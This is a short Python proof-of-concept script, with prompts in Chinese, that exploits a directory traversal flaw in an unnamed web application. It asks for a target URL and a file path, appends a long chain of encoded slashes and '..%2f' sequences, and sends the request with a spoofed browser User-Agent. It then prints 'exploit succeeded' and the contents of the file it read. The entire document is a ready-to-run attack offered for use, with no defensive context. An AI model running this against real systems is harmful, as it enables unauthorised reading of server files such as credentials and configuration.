import requests
url = input("请输入目标url:")
file = input("请输入需要读取的文件路径:")

def poc(url,file):
    url = url + "//%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f.." + file
    headers1 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
    }
    response = requests.get(url,headers=headers1)
    if response.status_code == 200:
        print("漏洞利用成功")
        print(response.text)
    else:
        print("利用失败")

if __name__ == "__main__":
    poc(url,file)
        








